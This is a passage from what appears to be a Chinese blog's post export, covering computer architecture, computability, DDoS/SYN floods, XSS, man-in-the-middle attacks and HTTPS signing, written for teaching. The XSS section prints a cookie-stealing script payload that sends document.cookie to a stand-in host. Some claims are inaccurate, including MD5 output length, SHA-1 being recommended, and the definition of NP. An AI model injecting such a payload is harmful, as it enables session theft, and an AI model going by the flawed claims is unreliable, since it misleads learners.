号是一个我们预设的控制符（指令），它的作用是加和目前状态。因此，控制单元识别出是控制符，并通知运算单元工作 运算单元从状态中读入 11、15 并进行计算，将结果 26 存储到状态 运算单元将结果回传给控制单元 控制单元将结果传输给读写头 这样，我们就通过图灵机计算出了 11+15 的值。不知道你有没有发现，图灵机构造的这一台机器，主要功能就是读写纸带然后计算；纸带中有数据、也有控制字符（也就是指令），这个设计和我们今天的计算机是一样的。 图灵通过数学证明了，一个问题如果可以拆解成图灵机的可执行步骤，那问题就是可计算的。另一方面，图灵机定义了计算机的组成以及工作原理，但是没有给出具体的实现。 冯诺依曼模型具体的实现是 1945 年冯诺依曼和其他几位科学家在著名的 101 页报告中提出的。报告遵循了图灵机的设计，并提出用电子元件构造计算机，约定了用二进制进行计算和存储，并且将计算机结构分成以下 5 个部分： 输入设备 输出设备 内存 中央处理器 总线 这个模型也被称为冯诺依曼模型，下面我们具体来看看这 5 部分的作用。 内存在冯诺依曼模型中，程序和数据被存储在一个被称作内存的线性排列存储区域。存储的数据单位是一个二进制位，英文是 bit。最小的存储单位叫作字节，也就是 8 位，英文是 byte，每一个字节都对应一个内存地址。内存地址由 0 开始编号，比如第 1 个地址是 0，第 2 个地址是 1， 然后自增排列，最后一个地址是内存中的字节数减 1。 我们通常说的内存都是随机存取器，也就是读取任何一个地址数据的速度是一样的，写入任何一个地址数据的速度也是一样的。 CPU冯诺依曼模型中 CPU 负责控制和计算。为了方便计算较大的数值，CPU 每次可以计算多个字节的数据。 如果 CPU 每次可以计算 4 个 byte，那么我们称作 32 位 CPU； 如果 CPU 每次可以计算 8 个 byte，那么我们称作 64 位 CPU。 这里的 32 和 64，称作 CPU 的位宽。 为什么 CPU 要这样设计呢？ 因为一个 byte 最大的表示范围就是 0~255。比如要计算 20000*50，就超出了byte 最大的表示范围了。因此，CPU 需要支持多个 byte 一起计算。当然，CPU 位数越大，可以计算的数值就越大。但是在现实生活中不一定需要计算这么大的数值。比如说 32 位 CPU 能计算的最大整数是 4294967295，这已经非常大了。 控制单元和逻辑运算单元CPU 中有一个控制单元专门负责控制 CPU 工作；还有逻辑运算单元专门负责计算。具体的工作原理我们在指令部分给大家分析。 寄存器CPU 要进行计算，比如最简单的加和两个数字时，因为 CPU 离内存太远，所以需要一种离自己近的存储来存储将要被计算的数字。这种存储就是寄存器。寄存器就在 CPU 里，控制单元和逻辑运算单元非常近，因此速度很快。 寄存器中有一部分是可供用户编程用的，比如用来存加和指令的两个参数，是通用寄存器。 还有一部分寄存器有特殊的用途，叫作特殊寄存器。比如程序指针，就是一个特殊寄存器。它存储了 CPU 要执行的下一条指令所在的内存地址。注意，程序指针不是存储了下一条要执行的指令，此时指令还在内存中，程序指针只是存储了下一条指令的地址。 下一条要执行的指令，会从内存读入到另一个特殊的寄存器中，这个寄存器叫作指令寄存器。指令被执行完成之前，指令都存储在这里。 总线CPU 和内存以及其他设备之间，也需要通信，因此我们用一种特殊的设备进行控制，就是总线。总线分成 3 种： 一种是地址总线，专门用来指定 CPU 将要操作的内存地址。 还有一种是数据总线，用来读写内存中的数据。 当 CPU 需要读写内存的时候，先要通过地址总线来指定内存地址，再通过数据总线来传输数据。 最后一种总线叫作控制总线，用来发送和接收关键信号，比如后面我们会学到的中断信号，还有设备复位、就绪等信号，都是通过控制总线传输。同样的，CPU 需要对这些信号进行响应，这也需要控制总线。 输入、输出设备输入设备向计算机输入数据，计算机经过计算，将结果通过输出设备向外界传达。如果输入设备、输出设备想要和 CPU 进行交互，比如说用户按键需要 CPU 响应，这时候就需要用到控制总线。 到这里，相信你已经对冯诺依曼模型的构造有了一定的了解。这里我再强调几个问题： 1. 线路位宽问题第一个问题是，你可能会好奇数据如何通过线路传递。其实是通过操作电压，低电压是 0，高电压是 1。 如果只有一条线路，每次只能传递 1 个信号，因为你必须在 0,1 中选一个。比如你构造高高低低这样的信号，其实就是 1100，相当于你传了一个数字 10 过去。大家注意，这种传递是相当慢的，因为你需要传递 4 次。 这种一个 bit 一个 bit 发送的方式，我们叫作串行。如果希望每次多传一些数据，就需要增加线路，也就是需要并行。 如果只有 1 条地址总线，那每次只能表示 0-1 两种情况，所以只能操作 2 个内存地址；如果有 10 条地址总线，一次就可以表示 210 种情况，也就是可以操作 1024 个内存地址；如果你希望操作 4G 的内存，那么就需要 32 条线，因为 232 是 4G。 到这里，你可能会问，那我串行发送行不行？当然也不是不行，只是速度会很慢，因为每多增加一条线路速度就会翻倍。 2. 64 位和 32 位的计算第二个问题是，CPU 的位宽会对计算造成什么影响？ 我们来看一个具体场景：要用 32 位宽的 CPU，加和两个 64 位的数字。 32 位宽的 CPU 控制 40 位宽的地址总线、数据总线工作会非常麻烦，需要双方制定协议。 因此通常 32 位宽 CPU 最多操作 32 位宽的地址总线和数据总线。 因此必须把两个 64 位数字拆成 2 个 32 位数字来计算，这样就需要一个算法，比如用像小时候做加法竖式一样，先加和两个低位的 32 位数字，算出进位，然后加和两个高位的 32 位数字，最后再加上进位。 而 64 位的 CPU 就可以一次读入 64 位的数字，同时 64 位的 CPU 内部的逻辑计算单元，也支持 64 位的数字进行计算。但是你千万不要仅仅因为位宽的区别，就认为 64 位 CPU 性能比 32 位高很多。 要知道大部分应用不需要计算超过 32 位的数字，比如你做一个电商网站，用户的金额通常是 10 万以下的，而 32 位有符号整数，最大可以到 20 亿。所以这样的计算在 32 位还是 64 位中没有什么区别。 还有一点要注意，32 位宽的 CPU 没办法控制超过 32 位的地址总线、数据总线工作。比如说你有一条 40 位的地址总线（其实就是 40 条线），32 位的 CPU 没有办法一次给 40 个信号，因为它最多只有 32 位的寄存器。因此 32 位宽的 CPU 最多操作 232 个内存地址，也就是 4G 内存地址。 总结关于计算机组成和指令部分，我们就先学到这里。这节课我们通过图灵机和冯诺依曼模型学习了计算机的组成、CPU 的工作原理等。此外，我们还顺带讨论了 32 位和 64 位的区别，现在，你可以回答 64 位和 32 位比较有哪些优势了吗？","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"计算机是什么","slug":"计操/计操入门","date":"2021-07-14T16:48:19.000Z","updated":"2021-07-14T09:00:48.258Z","comments":true,"path":"2021/07/15/计操/计操入门/","link":"","permalink":"https://www.shanghua.live/2021/07/15/%E8%AE%A1%E6%93%8D/%E8%AE%A1%E6%93%8D%E5%85%A5%E9%97%A8/","excerpt":"","text":"还是直接复制教程文章方便，文章来源自拉勾教育林䭽老师的重学操作系统课程 我记得自己在面试中遇到过这样一个问题：“可不可以计算一个人程序写得好不好？” 当时我也没有想明白“计算”这个词是什么意思。但事后分析来看，“计算”不就是写程序吗？ 其实简单理解这个问题就是“可不可以用机器来判断人的程序写得好不好？”如果从这个角度考虑，我是可以和面试官论述一番的。 后面我查阅了资料，历史上有一个对计算机领域影响颇深的可计算理论，面试官说的“计算”应该就来源于这里。其实继续深挖还能找出很多涉及计算机本源的有趣的知识，比如图灵机、冯诺依曼模型；再比如说 CPU 的构成、程序如何执行、缓存的分级、总线的作用等。 上面提到的这些内容其实都属于操作系统的前置课程，我会利用第一章 4 个课时和大家探讨一下计算机组成原理，然后我们再正式进入操作系统的学习。其实学习就是这样，追溯源头，回到本质，才能挖掘兴趣、激发思考，否则就变成了死记硬背。接下来我们将从计算能源的角度入手，来展开今天的课程学习。 芯片：计算能源我们知道第一次工业革命出现了蒸汽机，能源是煤炭。第二次工业革命出现了发电机，能源是电。20 世纪四五十年代，又发生了第三次科技革命，革命产物是计算机。而第四次科技革命，就发生在当下，出现了人工智能，能源是数据。 说到这里，你可能会有个疑问：第三次科技革命的能源是什么呢？ 你的第一反应可能是电，但是细想又觉得不对。前两次工业革命都有带来能源变革，为什么第三次科技革命就没有了能源变革？其实，第三次科技革命的能源是一种数字能量，本质是计算。 下面我们来看一看这种数字能量是如何产生的。电能供给给芯片，芯片中的一种电子元件晶振（也就是石英晶体）通电后产生震荡，震荡会产生频率稳定的脉冲信号。通常这是一种高频的脉冲信号，每秒可达百万次。然后，我们通过谐振效应发放这个信号，形成方波。再通过电子元件调整这种脉冲的频率，把脉冲信号转换为我们需要的频率，这就形成了驱动芯片工作的时钟信号。这种信号的频率，我们也称作芯片的时钟频率。最后，时钟信号驱动着芯片工作，就像人体的脉搏一样，每一次脉冲到来，都让芯片的状态发生一次变化，用这种方法，最终存储器中的指令被一行行执行。指令被执行，其实就是数据被计算，这就是我说的计算能量。 芯片普及后，不仅给计算机和手机提供支持，它们还被安装到了航天设备、能源设备、医疗设备及通信设备中，甚至小到电灯、微波炉、咖啡机、热水器里面都有了芯片。有了芯片，设备通电后才可以计算，有了计算，这些设备才能够实现更加复杂而精确的功能。 摩尔定律：计算能力的发展值得一提的是，历史上是先有计算机，后有的芯片。世界上第一个芯片，也被称作集成电路， 1958 年由美国德州仪器公司的工程师杰克·基尔比发明。而世界上第一台通用计算机 ENIAC 则是在 1946 年诞生于美国陆军弹道研究实验室。 看到这里你可能会有疑问，为什么是先发明计算机再发明芯片呢？ 其实，这个道理就好比很多程序员先实现产品功能，再考虑封装和复用。ENIAC 中负责计算的模块和后来的芯片原理是一样的，都是利用电路实现逻辑运算。只不过在 20 世纪 40 年代人们还没有将这种能力抽象成一个独立的产品，而且也没有办法解决电路体积的问题，ENIAC的体积看上去就像一所学校那么大。 芯片的计算能力来源于芯片内部的集成电路，集成电路大大减小了电路的体积，所有的元件都是用同一块半导体材料制作而成，也就是把所有的电路都集成到了一个单一的硅片上。为了提高计算性能，集成电路越来越复杂，里面的电子元件也越来越多。从最早拥有 100 个左右晶体管的小型集成电路，发展到 21 世纪初，拥有上亿电子元件的巨大规模集成电路。 芯片的发展，带来了计算能力的飞跃，ENIAC 只能每秒计算 5000 次加法和 400 次乘法，到 1978 年 8086 芯片已经可以每秒计算百万次了。而今天随便一个芯片不但可以轻轻松松每秒计算数亿次，而且不只有一个核心，是多个核心都能达到这一量级的计算能力。 在当时那个年代，Intel 的创始人之一摩尔就观察到了这个现象，并提出了摩尔定律：当价格不变时，集成电路中可容纳的晶体管数目约每隔 18～24 个月就会增加一倍，性能也将提升一倍。这一定律揭示了信息技术发展的速度，但到今天，摩尔定律失效了。因为随着芯片越来越小，在尺寸和散热等方面已经挑战了人类的极限，芯片中无法再放入更多的电子元件了。 但是计算能力又开始以另一种方式发展，比如一个普普通通的 NVIDA 显卡中就拥有了几百个核心，这样就可以进行大量的并发计算；另外，一个分布式的大数据集群，里面就可能有上千个核心。 展望未来，计算能力还有更多的增长点，不仅有可以无限提高计算能力的量子计算机，还有利用光学元件替代晶体元件的光电集成电路。 可计算理论：图灵机来做什么？比如：计算可不可以用来做饭？换一个更专业的说法，做饭可不可以被计算？ 生活在数字时代的我们，用着导航、玩着游戏，本能地知道很多问题是可以被计算的，但是生活在 20 世纪初的科学家们，需要在没有计算机和芯片的时代就想清楚这些问题，并不是一件容易的事情。 公理化体系和不完备性定理最早在 19 世纪初，德国著名数学家希尔伯特提出：这个世界可以建立一套完善的公理体系，由少数几个公理出发，推导出所有的定理和推论。这样就可以逐渐通过这种方法将世界上的万事万物都统一到一个体系中。 当然，这只是一个非常美好的设想，如果万事万物都可以用形式化（简单理解就是程序化规范化）的手段统一到一套体系中，也就意味着计算能力将被无限扩展，只要给定足够的时间和空间，计算机就可以完成任何工作。 但在不久后，美籍数学家哥德尔就提出了哥德尔不完备性定理，内容是：即便在完善的公理体系中仍然可以找到不能被证明也不能被证伪的命题。 这让我联想到，一说谎，鼻子就会变长的匹诺曹。如果他说“我说谎了”，那么他的鼻子应该变长还是变短呢？对于人类而言，这个问题可以理解，但是对于计算机来说这个问题是不可以被计算的。 正是因为世界上存在着大量的这种“公说公有理，婆说婆有理”的问题，才让大家认识到计算不能解决所有问题，所以：计算机能力也是有边界的。哥德尔的不完备性定理，让大家看到了世界上还有大量不可计算的问题。 图灵机和可计算理论于是人们意识到了需要一个理论，专门回答这样的问题：哪些问题可以被计算，哪些不可以被计算，这就是可计算性理论，该理论是计算机科学的理论基础之一。 1936 年，被誉为人工智能之父的阿兰·图灵提出了图灵机，它是一种不断执行指令的抽象计算机。之所以说抽象，是因为图灵并没有真的造出这台机器，而是把它当成理论去和大家探讨可计算问题。 图灵发现如果一个问题是可计算的，那么它的解决方案就必须可以被具化成一条条的指令，也就是可以使用图灵机处理。因此，不能使用图灵机处理的问题，都是不可计算的问题。 比如一个马达的控制程序是可计算的，因为控制过程是可以被抽象成一条条指令的（即可以写程序实现）。比如程序可以先读入传感器的数据，然后根据数据计算出下面要进行加速还是减速。 不可计算问题但当图灵机遇到“素数是不是有无穷多个？”这样的问题时，事情就变得复杂了。虽然，我们可以通过有限的步骤计算出下一个素数。比如可以每次尝试一个更大的数字，然后通过一系列计算过程判断该数字是不是素数，直到找到一个更大的素数。古希腊数学家埃拉托斯特尼就发明了筛选出给定范围内所有素数的方法。 ，我们利用埃拉托斯特尼筛法找到的素数越来越多。但是，我们还是不能回答“素数是不是有无穷多个”这样的问题。因为要回答这样的问题，我们会不停地寻找下一个素数。如果素数是无穷的，那么我们的计算就是无穷无尽的，所以这样的问题不可计算。 停机问题我们也无法实现用一个通用程序去判断另一个程序是否会停止。比如你用运行这段程序来检查一个程序是否会停止时，你会发现不能因为这个程序执行了 1 天，就判定它不会停止，也不能因为这个程序执行了 10 年，从而得出它不会停止的结论。这个问题放到图灵机领域，叫作停机问题，我们无法给出一个判断图灵机是否会停机的通用方法，因此停机问题是一个经典的不可计算问题。 计算能力的边界在哪里？我们可以把世界上想解决的事情都称作问题，解决问题往往需要消耗芯片的计算能力，这通常称作时间开销，另外解决问题还需要消耗内存，称作空间开销。 问题的分类世界上有一类问题，无论我们消耗多少时间和空间也无法解决，这类问题就包括“停机问题”，称作不可计算问题，我们无法用计算机精确地解决这类问题。世界上不可计算问题多，还是可计算问题多，也是一个不可计算问题，但直觉告诉我们一定是不可计算问题更多。 另外在可计算的问题中，有困难问题，也有简单问题，我们通常用复杂度来衡量，比如： “求数组第 10 个元素”，计算这种问题，时间开销、空间开销都不会随着问题规模增长，我们记为 O(1) “求数组中的最大值”，计算这种问题，时间开销会随着数组规模线性增大，记作 O(N)，N 是问题的规模 还有像“求一个n*n矩阵的和”，如果n是规模，那么时间开销会随着问题规模的平方增长，我们称作 O(N2) 当然也有更加复杂的数学模型，比如说O(N3)、O(N4)、O(N100)等 P 问题 vs NP 问题按照摩尔定律所说，人类的计算能力每 18～24 个月翻一倍，我们的计算能力在呈指数形式上升。因此，在所有可以计算的问题中，像 O(N1000)的问题，虽然现在的计算能力不够，但是相信在遥远的未来，我们会拥有能力解决。这种我们有能力解决的问题，统称为多项式时间（ Polynomial time）问题。我们今天能解决的问题，都是多项式时间的问题，下面记为 P 类型的问题。 另外，还有一类问题复杂度本身也是指数形式的问题，比如 O(2N)的问题。这类型的问题随着规模 N 上升，时间开销的增长速度和人类计算能力增长速度持平甚至更快。因此虽然这类问题可以计算，但是当 N 较大时，因为计算能力不足，最终结果依然无法被解决。 由此可见，不是所有可以计算的问题都可以被解决，问题如果不能在多项式时间内找到答案，我们记为 NP 问题。 有一部分 NP 问题可以被转化为 P 问题，比如斐波那契数列求第 N 项，可以用缓存、动态规划等方式转化为 O(N) 的问题。但还有更多的 NP 问题，比如一个集合，找出和为零的子集，就没能找到一个合适的转换方法。其实说这么多，就是想告诉大家：如今还有很多问题无法解决，它的数量远远大于我们可以解决的问题，科学家、工程师们也只能望洋兴叹了。 人工智能此外，包括停机问题、包括 NP 问题在内的很多问题，虽然不能解决，但可以努力让计算机的解决方案超过人类的水平，这就是人工智能。 比如下围棋，围棋盘是 19*19 的，共有 361！种情况，如果遍历 361！种情况，并进行打分，共有 10 的 170 次方种可能，因此，我们的计算能力是远远不足的。但是如果使用人工智能方法对可能出现的部分情况进行概率判断，在不追求绝对精确的情况下，人工智能就可以超过人类选手。 AlphaGo 战胜李世石就是利用了基于概率的不完全解法，这种解法已经可以超过部分人类职业选手了，也就是说计算机的解法已经超过了人类。当然，人类的强项在于理解和分析，人有两种思维，归纳和假设，这两种思维都是计算机无法计算的。机器用概率理解围棋，局部来说机器下得更好，但是人可以制造机器，因此，人的感悟更有意义，谈不上孰优孰劣。 针对这种解决问题的方法，20 世纪中人工智能之父图灵，提出图灵测试，就是在一次人机对话中，随机抽样一部分的实验者和机器对话，如果这部分实验者有较大的百分比判断对面是人而不是机器，那这台机器就通过了图灵测试。在围棋领域，可以说，AI 通过了图灵测试。但围棋的 AI 不能下象棋，这也是 AI 的一个劣势。所以广义的 AI 还没有出现，现在出现的是在某个专业领域的 AI。 总结下面我们进行总结。本课时是一个理解操作系统知识必不可少的计算机原理引导课。 我们学习了芯片，芯片将电能转化为计算能量，计算能量推动程序执行 接着提到了摩尔定律，了解到我们的计算能力仍在飞速发展 还花了篇幅讲了图灵机，从而进一步认识了人工智能之父阿兰·图灵，图灵机具体的设计和构造，这将在02 课时程序的执行部分进一步讨论 最后普及了图灵测试和人工智能的基本概念，带你了解了计算机的能力边界 下面我们回到最初的问题：“可不可以计算一个人程序写得好不好？” 这个问题可以这样来思考，如果把问题降级，变成：“可不可以计算一个人写的程序会不会停机？” 这个问题就如同停机问题，无法计算，因此这是一个不可计算的问题。但是我们通过设立规则，比如检查缩进、检查函数的复用情况、检查类的命名情况，给写程序的人更好的建议。另外，我们也可以通过 AI 技术，让机器在“程序写得好不好”这个问题的判定能力上，达到人类的水平，通过图灵测试。 综上，从绝对的对错角度去看，这是一个不可计算问题，因为它没有办法被完全解决；但是从图灵测试层面来看，虽然目前无法解决这个问题，但是我们有理由相信，在未来，计算机对这个问题的解决方案，是可以超过人类的。","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"SYN 拒绝攻击","slug":"计网/SYN拒绝攻击","date":"2021-07-12T16:20:20.000Z","updated":"2021-07-12T08:50:10.914Z","comments":true,"path":"2021/07/13/计网/SYN拒绝攻击/","link":"","permalink":"https://www.shanghua.live/2021/07/13/%E8%AE%A1%E7%BD%91/SYN%E6%8B%92%E7%BB%9D%E6%94%BB%E5%87%BB/","excerpt":"","text":"SYN 拒绝攻击安全无小事。2016 年 DNS 提供商 Dyn 遭遇了一次大规模的 DDoS（分布式拒绝服务攻击），有 14000 个网站域名受到影响。2020 年 7 月份，Twitter 遭大规模攻击，黑客控制了包括马斯克、盖茨、奥巴马等人的 Twitter 账号，诱导用户购买比特币，最终骗取了 11W 美金。2021 年 4 月份，还有黑客利用 Github 的 Actions（Github 的一种 CI/CD 方案），诱导用户进行 git 操作时触发恶意比特币的矿机。 如果一个互联网公司的安全出了故障，那么影响将是巨大的（某知名技术社区的用户名和密码被大规模泄露） 拒绝服务攻击（DOS）拒绝服务攻击（Denial-of-Service Attack,DOS） 虽然目前互联网越来越趋向于正规化，但是对于黑产还有利用 DOS 攻击黑吃黑的现象，比较常见的就是热血传奇这款游戏的私服，搭建一个私服可以获得大额非法收入，但是因为是黑产也会经常受到黑客的攻击。黑客攻击后，再发邮件到管理员邮箱索取金钱，威胁用户不尽快打款就会一直攻击。 在过去，黑产间的攻阀，DoS 就可以作为一种常见武器。DoS 的原理就是利用大量的流量迅速向一个网站发送出去。这种流量可能是应用层的，比如大量 HTTP 请求；也可以是传输层，比如大量的 TCP 请求。比如 2018 年 2 月 18 日，Github 就遭受了一场超大规模的 DoS 攻击，瞬间流量峰值达到了 1.35Tbps。之后，黑客还对 Google、亚马逊等网站也进行了攻击。 攻击者往往没有足够的经济实力购买机器，而是利用中病毒、木马的机器组织流量攻击。这些中病毒的机器，我们俗称“肉鸡”。顶级的黑客往往控制着大量的肉鸡，一声令下，肉鸡就开始疯狂向目标发送网络封包，直到打垮目标。因为肉鸡是分散在世界各地的，因此这种攻击我们也称为分布式拒绝服务攻击（Distributed Denial-of-Service Attack， DDoS）。 DDoS 的种类 直接不停发送 PING 消息的，利用底层的 ICMP 协议，称为 ICMP 攻击 走 UDP 协议的，称为 UDP 洪水（UDP Flood） 不停利用 TCP 协议发送 SYN 消息的，也叫 SYN 攻击 模拟用户行为，不停发帖、浏览帖子、浏览网页、加购物车等，称为挑战黑洞攻击（Challenge Collapsar） 防范措施防火墙会根据特征识别出攻击行为，通过这样对的方式将攻击行为过滤掉，让系统不会因为 DDOS 而过载造成崩溃 进行多活建设：两地三机房，日常生产环境，同城灾备环境，异地灾备环境，CDN 是大量缓存节点，DDOS 攻击 CDN 的时候用不上力，CDN 在解决 DDOS 时也有很好的效果 小团队开业设计一台吞吐量极高的代理服务器，作为反向代理挡在所有流量前面，如果遇到 DDOS ，代理服务器可以识别出一些特征并丢弃一些流量 在遇到攻击的时候，对服务适当降级也是有必要的，通过防火墙造成一部分的误伤来识别更多的攻击流量 跨站脚本攻击（XSS） 2021 年 2 月印度的一名测试工程师在苹果 icloud 官网中发现了一个跨站脚本攻击漏洞，并向苹果提交了具体的漏洞说明和触发的操作步骤 事后，苹果公司给这名印度人发放了 5000 美金的奖金 跨站脚本（Cross Site Scripting）：利用漏洞将脚本注入到网页中，提交个人信息的输入框，如果在服务区没有处理好就有可能触发跨站脚本 假设有一个输入个人签名的多行文本输入框，正常用户输入几句有趣的话，但是黑客可能会尝试输入 1&lt;script&gt;document.createElement(&#x27;img&#x27;).src=&quot;https://some.site.com?cookie=document.cookie&quot;&lt;/script&gt; 如果这段话被显示到用户的个人主页，那么访问这个用户空间的其他用户就会被攻击，进而被黑客拿走 Cookie 中的关键信息。 XSS 攻击模式：想办法向网站的页面上注入脚本，前端框架 React 或 Vue 开发的页面已经基本杜绝了被 XSS 的可能。但是有时候如果工作出现某些疏漏，还是会导致 XSS 的发生。所以正确的做法是上线前拜托安全部门的同学协助进行一些针对 XSS 漏洞的扫描。 中间人攻击我们国家目前在打击网络电信诈骗案中，就有这样一种形式。一些不法分子利用伪基站，比如找一个人多的地方，用自己的伪基站设备伪装成基站，向用户提供网络。一些离不法分子较近的人，手机可能会连接上伪基站。连接上后，不法分子的伪基站就成了你上网的代理，可以进行很多非法操作。因此，从这个角度看，中间人黑进你附近的网络，成为你上网的“代理”，并不是非常难的一件事情。不懂技术的犯罪分子，通过购买伪基站设备，就可以充当中间人。 在遇到中间人攻击时，互联网的信用体系、操作系统、浏览器等就会帮你把好最后一关。比如你访问淘宝购物，中间人向你投放假网页。浏览器就会去验证这个假网页的证书，是不是淘宝的证书。去年 Github 在国内疑似被中间人攻击的案例中，国内很多用户看到的现象是浏览器提示用户浏览的网站不安全。这种情况就是浏览器在校对证书的时候发现了疑点。如果你上网遇到这种情况应该选择立即关闭这个网页，不进行后续的操作，防止被骗。 生活在当今时代，作为个人，网络安全是一件大事，购票信息、出行记录、账号密码、位置信息等，在为公司工作的时候，要保管好自己的账号和工作用的计算机要远离非正规渠道获得的软件 总结生活在当今时代，作为个人，网络安全是一件大事。你的购票信息、出行记录、账号密码、位置信息等，都需要你有防范意识，防止被不法分子拿走。在为公司工作的时候，要保管好自己的账号。特别是你工作用的计算机，要远离非正规渠道获得的软件。你的工作计算机一旦中了木马，成了肉鸡，那不法分子完全可以用你的工作计算机作为跳板，登录公司服务器。 另一方面，作为公司和团队，也要有较强的安全意识。当然，安全领域有自己的专业知识和人才。在互联网产品初期，往往承担不起昂贵的防火墙和雇佣安全专家的费用，这个时候需要开发者主动去学习安全知识，尽可能提升被攻破的成本。当业务发展到一定程度后，就需要马上雇佣安全专家，以及购买包括防火墙在内的网络安全设备。 SYN 攻击是 DDoS 攻击的一种形式。这种形式攻击者伪装成终端不停地向服务器发起 SYN 请求。通常攻击者的肉鸡，发送了 SYN 之后，不等给服务端 ACK，就下线了。 这样攻击者不断发送 SYN ，然后下线，而服务端会等待一段时间（通常会在 3s 以上），等待 ACK。这样就导致了大量的连接对象在服务端被积累。 针对这个特点可以实现一个 TCP 代理（防火墙），发现有发送 SYN 但是不给 ACK 的行为就对目标 IP 地址禁用一段时间。这个策略平时可以配置成开关，等到被攻击的时候打开。另一方面，可以适当提升连接数支持。","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"HTTPS 协议","slug":"计网/HTTPS协议","date":"2021-07-12T13:08:19.000Z","updated":"2021-07-12T08:19:40.910Z","comments":true,"path":"2021/07/12/计网/HTTPS协议/","link":"","permalink":"https://www.shanghua.live/2021/07/12/%E8%AE%A1%E7%BD%91/HTTPS%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"HTTPS 协议延续上一讲的内容，我们继续聊解决信用的话题。解决信用，仅仅有加密和解密是不够的。加密解密解决的只是传输链路的安全问题，相当于两个人说话不被窃听。可以类比成你现在生活的世界——货币的信用，是由政府在背后支撑的；购房贷款的信用，是由银行在背后支撑的；你肯购买视频网站的会员，也是由公司的信誉在背后支撑；就连比特币的信用也需要有知名人士（比如马斯克等）在不断喊话…… 我们回到一个很小的问题，你在上网时候，凭什么可以相信你访问的网站没有骗你？今天我们就以这个话题为引，从 HTTPS 协议的信用角度去看互联网的整个信用体系。 摘要和签名现实的生活当中，如果想证明一份合同没有被修改过，人们会在合同上盖一个齐缝章，并附上自己的签名。签名和盖章其实是一个含义，目的是证明自己签署过某份协议，而且一经签署，协议就不能再变更。 如果想阻止一份合同被修改，最容易想到的方式是加密。合同一旦被加密了，要修改就必须原文和密文一起修改。虽然这没有解决最本质的问题——谁来提供信用。但是这样的种做法解决了一个最基础的问题。如果有人想修改合同，就必须知道密钥。 摘要算法但是加密算法的计算量较大，而且结果通常比原文体积大。那是否有其他更好的处理方式呢？其实一个更简单的做法，就是利用摘要算法。摘要，顾名思义，和现实中文章的摘要是一样的。相当于给一篇文章，形成一个提要。只不过，计算机世界的摘要算法算出来的结果并不是对原文真的概括总结，而是一个大数字。 给计算机一篇文章，计算机用摘要算法生成一个字符串 如果文章内容改变，哪怕是一个字，一个标点符号，摘要也会完全改变 和完全加密一篇文章相比，摘要的体积很小，因此非常有利于存储和传输。通常对于一个给定的摘要算法，无论你的文章多大，有多少字节，最终生成摘要的字节数是固定的。以 MD5 摘要算法为例： 12md5(1bit数据)md5(1M数据) 无论数据多大，经过 MD5 计算后，都会形成一个 128 位的值，换算成 16 进制是 16 个字符。可见，摘要算法是比较省空间的，如果用加密算法，那么体积会和原文大小正相关。用 MD5 摘要一个 100M 的视频文件，也会形成只有 128 位的值。 摘要是对原文的证明，从原文到摘要是一个不可逆的过程 通过原文可以计算摘要，一旦原文发生变化，哪怕是一个标点符号，摘要也会发生变化，而通过原文返回摘要，几乎是不可能的。因为摘要和原文并不是一对一的关系，是多个原文对应一个摘要。而且，想要找到两个摘要碰撞的原文是非常困难的发生概率相当于买彩票中大奖 。而且就算黑客找到了碰撞的原文，也未必可以起到作用。当然，摘要碰撞是危险的。 SHA-1 摘要算法目前多数网站用户的密码是以摘要的形式保存的，程序员会经常接触到数据库，而黑客也有可能黑进公司的数据库，因此密码以摘要显示保存更加安全，可以有效防止用户敏感数据被盗，网站设计当中，是不存储用户的密码的，而是只存储用户密码的摘要，如果网站数据库被攻破，但是黑客只能拿到摘要，无法拿到用户密码的原文，因此摘要碰撞是很危险的，因此推荐使用摘要更难碰撞的 SHA-1 摘要算法 摘要算法解决了以下几个问题 为原文生成固定长度的内容证明（内容摘要） 摘要无法被逆向得到原文，看上去是随机的，黑客拿到了也不知道原文 极少概率碰撞：不同的内容极大概率（绝大多数接近 100%）会生成不同的摘要 但是，你要明白，摘要只是一个工具，它可以用来解决很多问题，比如说用户密码存储问题。对于互联网的信用，它还只是工具。 签名摘要的另一个非常重要的用途就是签名。举个例子，张三和李四签署一份合同。 如果张三将合同生成摘要，再用自己的私钥加密摘要，得到一个密文串，那么这个串就是张三对合同的数字签名（DIgital Sign）。 张三生成好数字签名，将自己的公钥、合同原文以及数字签名交给李四保管，就基本上达成了今天我们签约双方交换合同的效果。 你可以这样思考，数字签名是对摘要的加密，因此数字签名本身还拥有摘要能力的。 如果原文没有被修改，那么下面的条件会满足： 1公钥解密（数字签名） == 签订合同时的原文摘要 == 摘要算法（当前原文） == 当前摘要 比如原文被修改，那么可以通过重新计算摘要，对比解密后的数字签名（其实就是早先的摘要）。对张三而言，李四不知道自己私钥，因此他篡改不了自己签名的这份合同。对李四而言，张三无法抵赖自己没有签署过这份合同，因为李四可以拿着张三的公钥解密得到摘要，然后再对比合同原文的摘要。因为是张三私钥加密，如果张三的公钥能解开，那说明就是张三签署的合同。 证书 张三和李四的公钥凭什么具有公信力，谁来证明，张三给李四的公钥，就是张三的公钥；李四给张三的公钥，就是李四的公钥 谁来证明张三和李四，是合法的两个人，具有签署合同的权利 信用的提供最基本问题：信用必须有人提供，权威机构（比如公安局）可以证明张三是张三，李四是李四，同理，互联网世界也需要机构提供证书，由机构证明他们的公钥。这并不是说，张三自己不能制作自己的证书，只不过张三做的证书没有公信力。互联网中，加密算法、签名算法都是公开的，只不过张三自己制作的证书背后没有信用的支持。 证书的制作证书是一个身份证明文件，比如互联网中，经常会为一个域名制作证书。通常的一个域名证书会有一些基础信息： 覆盖的域名 整数的用途 签发时间 到期时间 域名方的公钥 证书的目的：证明身份，让其他人可以使用自己的公钥，权威机构用自己的私钥对整数进行签名，整数上需要增加 3 个信息，权威机构的名称，权威机构的签名，权威机构的网址，有了权威机构的签名，这个证书就合法了 信用链的验证现在问题来了，张三把证书给了李四，李四拿到张三的证书，并看到某权威机构的签名。李四的第一反应就是——这个签名是权威机构的吗？ 计算机产业的底层建筑帮助大家解决了这个问题——这个被称作信用链。 当我们用 HTTPS 协议打开拉勾教育的页面时，这个证书会随着 HTTPS 的握手被下载到本地。浏览器打开证书，发现提供方式 GlobalSign。GlobalSign（Certificate 